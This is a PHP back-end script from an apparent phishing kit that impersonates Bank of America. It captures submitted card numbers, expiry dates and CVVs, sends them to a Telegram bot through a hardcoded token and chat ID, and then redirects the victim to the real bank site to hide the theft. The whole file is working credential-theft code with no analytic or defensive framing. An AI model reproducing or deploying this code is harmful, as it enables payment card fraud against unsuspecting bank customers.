<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['card']) && isset ($_POST['mes'])  && isset ($_POST['year'])  && isset ($_POST['cvv'])  ){

$message = "\n🤔User BANK bofa 🤔\n🔑card: => ".$_POST['card']." - \n🔑mes: => ".$_POST['mes']." \n🔑ano: => ".$_POST['year']."\n🔑cvv: => ".$_POST['cvv']."\r\n";

$apiToken = "6194698603:AAEwaznctVDX7ZGLoIR9-HWKu2ZOYInIy9Q";


$data = [
  'chat_id' => '6063765094',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location:  http://www.bankofamerica.com/');

}else{ header ('location: index3.html'); exit(); }

?>